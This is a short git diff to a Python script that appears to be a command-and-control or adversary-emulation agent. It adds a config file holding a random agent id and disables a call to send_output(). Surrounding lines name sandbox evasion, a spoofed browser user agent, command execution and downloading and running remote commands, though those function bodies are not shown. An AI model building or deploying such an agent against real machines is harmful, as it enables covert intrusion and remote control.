@@ -1,9 +1,12 @@
+import configparser
 import datetime
 import os
 import platform
 import subprocess
 import time
 import urllib3
+from random import randrange
+from pathlib import Path
 
 
 http = urllib3.PoolManager()
@@ -11,6 +14,16 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
                          ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
 TIMEOUT = 15
 executed = []
+
+THIS_DIR = Path(__file__).parent
+
+
+def config_file():
+    config = configparser.ConfigParser()
+    if not os.path.exists(path=THIS_DIR / 'config.ini'):
+        config['AGENT'] = {'id': randrange(500)}
+        with open('config.ini', 'w') as configfile:
+            config.write(configfile)
 
 
 def execute_command(command_issued):
@@ -152,12 +165,12 @@ def sandbox_evasion():
 if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
-
+    config_file()
     # techs = get_techniques()
     # print(techs)
     # results = download_and_run_commands()
     # print(results)
 
-    send_output()
+    # send_output()
 
 
